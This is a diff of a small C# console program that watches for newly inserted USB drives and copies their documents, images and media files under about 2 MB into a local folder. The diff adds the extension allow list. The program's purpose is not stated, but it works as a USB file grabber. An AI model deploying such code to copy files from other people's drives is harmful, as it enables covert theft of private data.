@@ -2,14 +2,8 @@
 using System.Threading;
 using System.Collections.Generic;
 
-const uint checkEverySeconds = 1;
-const uint maxFileSize = 2000000;
-
-/* TODO
-    - fix usb remove
-    - select only some file extensions
-*/
-
+const uint checkEvery = 1000; // ms
+const uint maxFileSize = 2000000; // B
 
 static void CopyFiles(string drive)
 {
@@ -17,13 +11,22 @@ static void CopyFiles(string drive)
     FileInfo[] files = dir.EnumerateFiles().ToArray();
     foreach (FileInfo file in files)
     {
-        if (file.Name == "IndexerVolumeGuid" || file.Name == "WPSettings.dat")
+        string[] allowedFiles = {".txt", ".png", ".jpg", ".jpeg", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx",
+                                 ".mp4", ".mkv", ".wav", ".mp4", ".pdf", ".avi", ".odt", ".webp"};
+
+        bool allowed = false;
+        foreach (string allowedFile in allowedFiles)
         {
-            continue;
+            if (file.Name.EndsWith(allowedFile))
+            {
+                allowed = true; 
+                break;
+            }
         }
+        if (!allowed) continue;
 
         string newFileLocation = Path.Combine("files", file.Name);
-        if (file.Length < maxFileSize && File.Exists(newFileLocation) == false)
+        if (file.Length < maxFileSize && !File.Exists(newFileLocation))
         {
             File.Copy(file.FullName, newFileLocation, false);
             Console.WriteLine($"copied: {file.Name}");
@@ -37,9 +40,8 @@ static void CopyFiles(string drive)
 
 List<DriveInfo> previousDrives = new List<DriveInfo>();
 
-Console.WriteLine("Drives detected:");
 foreach (DriveInfo drive in previousDrives) Console.Write(drive.Name + ' ');
-Console.WriteLine("\nlistening for new drives...\n");
+Console.WriteLine("listening for usbs...\n");
 
 
 if (Directory.Exists("./files") == false) Directory.CreateDirectory("./files");
@@ -73,5 +75,5 @@ while (true)
     foreach (DriveInfo drive in forRemoval) previousDrives.Remove(drive);
 
 
-    Thread.Sleep((int)checkEverySeconds * 1000);
+    Thread.Sleep((int)checkEvery);
 }
